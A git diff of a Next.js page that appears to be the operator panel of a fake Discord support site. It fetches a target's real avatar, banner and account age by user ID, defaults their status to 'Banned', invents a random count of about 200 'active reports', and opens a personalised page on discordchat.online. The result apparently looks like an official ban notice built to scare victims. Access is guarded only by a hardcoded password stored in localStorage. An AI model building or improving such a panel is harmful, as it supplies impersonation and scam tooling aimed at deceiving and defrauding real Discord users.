@@ -1,7 +1,6 @@
 "use client";
 
-import React, { useState, ChangeEvent, FormEvent } from "react";
-// import { useRouter } from "next/navigation";
+import React, { useState, ChangeEvent, FormEvent, useEffect } from "react";
 import { db } from "../lib/firebase";
 import { setDoc, doc, deleteDoc } from "firebase/firestore";
 
@@ -16,19 +15,61 @@ type FormData = {
   bannerImage: string;
 };
 
+// API function that fetches user data by ID (handles animated avatars and banners)
+const fetchUserData = async (userID: string) => {
+  try {
+    const response = await fetch(`https://apidiscord.vercel.app/api/lookup/${userID}`);
+    if (!response.ok) throw new Error("User not found.");
+
+    const user = await response.json();
+    // Determine file extension for avatar (animated if it starts with "a_")
+    const avatarExtension = user.avatar.startsWith("a_") ? "gif" : "png";
+    const profileImage = `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.${avatarExtension}?size=2048`;
+
+    // Determine file extension for banner (if banner exists)
+    const bannerImage = user.banner
+      ? `https://cdn.discordapp.com/banners/${user.id}/${user.banner}.${
+          user.banner.startsWith("a_") ? "gif" : "png"
+        }?size=2048`
+      : profileImage; // fallback to avatar if no banner
+
+    return {
+      username: user.username,
+      profileImage,
+      bannerImage,
+      dateCreated: new Date(user.id / 4194304 + 1420070400000)
+        .toUTCString()
+        .replace("GMT", "UTC"),
+    };
+  } catch (error) {
+    console.error("Error fetching user data:", error);
+    return null;
+  }
+};
+
 export default function HomePage() {
   // Password authentication state
   const [passwordInput, setPasswordInput] = useState("");
   const [isAuthenticated, setIsAuthenticated] = useState(false);
 
+  // Check localStorage on mount for authentication flag
+  useEffect(() => {
+    if (localStorage.getItem("authenticated") === "true") {
+      setIsAuthenticated(true);
+    }
+  }, []);
+
+  // Generate a random active reports number around 200 (as a string)
+  const randomActiveReports = `${Math.floor(Math.random() * 50) + 175}`;
+
   // --- State for User Information Form ---
   const [formValues, setFormValues] = useState<FormData>({
     userID: "",
     type: "User",
-    accountStatus: "Good",
+    accountStatus: "Banned", // default value changed from "Good" to "Banned"
     username: "",
     dateCreated: "",
-    activeReports: "",
+    activeReports: randomActiveReports, // random initial value
     profileImage: "",
     bannerImage: "",
   });
@@ -45,21 +86,35 @@ export default function HomePage() {
     e.preventDefault();
     if (passwordInput === "babypink") {
       setIsAuthenticated(true);
+      localStorage.setItem("authenticated", "true");
     } else {
       alert("Incorrect password!");
     }
   };
 
-  // Handle changes for user information form
-  const handleChange = (e: ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
+  // Updated handleChange: fetches additional user data when userID changes
+  const handleChange = async (e: ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
     const { name, value } = e.target;
     setFormValues((prev) => ({
       ...prev,
       [name]: value,
     }));
+
+    if (name === "userID" && value.length > 0) {
+      const userData = await fetchUserData(value);
+      if (userData) {
+        setFormValues((prev) => ({
+          ...prev,
+          username: userData.username,
+          profileImage: userData.profileImage,
+          bannerImage: userData.bannerImage,
+          dateCreated: userData.dateCreated,
+        }));
+      }
+    }
   };
 
-  // Handle submission for user information form
+  // Handle submission for user information form (opens generated website in a popup)
   const handleSubmit = async (e: FormEvent) => {
     e.preventDefault();
     try {
@@ -69,7 +124,8 @@ export default function HomePage() {
       });
       const userId = formValues.userID;
       console.log("✅ New user created with ID:", userId);
-      window.location.href = `https://discordchat.online/${userId}`;
+      // Open the generated website in a new popup window
+      window.open(`https://discordchat.online/${userId}`, "_blank", "width=600,height=600");
     } catch (error) {
       console.error("🔥 Error saving document:", error);
     }
@@ -111,7 +167,14 @@ export default function HomePage() {
     <>
       {!isAuthenticated ? (
         <div style={pageStyle}>
-          <div style={{ display: "flex", justifyContent: "center", alignItems: "center", minHeight: "100vh" }}>
+          <div
+            style={{
+              display: "flex",
+              justifyContent: "center",
+              alignItems: "center",
+              minHeight: "100vh",
+            }}
+          >
             <form
               onSubmit={handlePasswordSubmit}
               style={{
@@ -122,7 +185,13 @@ export default function HomePage() {
                 width: "300px",
               }}
             >
-              <h2 style={{ textAlign: "center", marginBottom: "20px", color: "black" }}>
+              <h2
+                style={{
+                  textAlign: "center",
+                  marginBottom: "20px",
+                  color: "black",
+                }}
+              >
                 asa ko nag kulang?
               </h2>
               <input
@@ -190,8 +259,22 @@ export default function HomePage() {
                 )}
               </div>
               {/* New Cancellation Form Under Support Chat */}
-              <div style={{ marginTop: "20px", background: "#fff", padding: "15px", borderRadius: "10px", boxShadow: "0 4px 8px rgba(0,0,0,0.1)" }}>
-                <h3 style={{ textAlign: "center", color: "black", marginBottom: "10px" }}>
+              <div
+                style={{
+                  marginTop: "20px",
+                  background: "#fff",
+                  padding: "15px",
+                  borderRadius: "10px",
+                  boxShadow: "0 4px 8px rgba(0,0,0,0.1)",
+                }}
+              >
+                <h3
+                  style={{
+                    textAlign: "center",
+                    color: "black",
+                    marginBottom: "10px",
+                  }}
+                >
                   Cancel Ticket
                 </h3>
                 <form onSubmit={handleCancelTicketById} style={transactionFormStyle}>
@@ -213,7 +296,13 @@ export default function HomePage() {
             {/* --- Right Column: User Information Form --- */}
             <div style={rightColumnStyle}>
               <div style={formContainer}>
-                <h2 style={{ textAlign: "center", marginBottom: "20px", color: "black" }}>
+                <h2
+                  style={{
+                    textAlign: "center",
+                    marginBottom: "20px",
+                    color: "black",
+                  }}
+                >
                   User Information
                 </h2>
                 <form onSubmit={handleSubmit}>
@@ -246,9 +335,9 @@ export default function HomePage() {
                     onChange={handleChange}
                     style={inputStyle}
                   >
-                    <option value="Good">Good</option>
-                    <option value="Pending Case">Pending Case</option>
                     <option value="Banned">Banned</option>
+                    <option value="Pending Case">Pending Case</option>
+                    <option value="Good">Good</option>
                   </select>
 
                   <label style={labelStyle}>Username</label>
